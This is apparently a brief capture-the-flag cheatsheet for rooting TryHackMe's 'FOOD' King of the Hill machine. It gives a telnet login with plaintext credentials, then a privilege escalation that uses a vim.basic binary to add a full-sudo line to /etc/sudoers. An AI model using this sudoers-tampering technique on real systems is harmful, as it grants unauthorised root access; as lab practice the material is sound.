This a github cheatsheet of owning the machines in King of the Hill game of TryHackMe.


```
Machine name: FOOD
```
NMAP scan with `-p-` revealed that there is a telnet running on port 46969. <br /> 

So following are the steps to get root, ASAP. <br /> 

1. Connect on the port: <br /> 
    `telnet <IP> 46969` <br /> 
2. The Username and password are in caesor cipher. <br /> 
    Username: food <br /> 
    Password: givemecookies <br /> 
3. After scanning the machine with linPEAS.sh, We found that `vim.basic` binary is vuln to read and write to privilaged files.
    `vim.basic /etc/sudoers` <br /> 
    Press i <br /> 
    Add this line after the line with `root` is the start. <br /> 
    `food ALL=(ALL:ALL) ALL` <br /> 
    Press Ctrl+[ <br /> 
    Press :w! Enter <br /> 
    Press :q! Enter <br /> 
    `sudo su` <br /> 
    In prompt enter the password of food, i.e.  `givemecookies` <br /> 
    
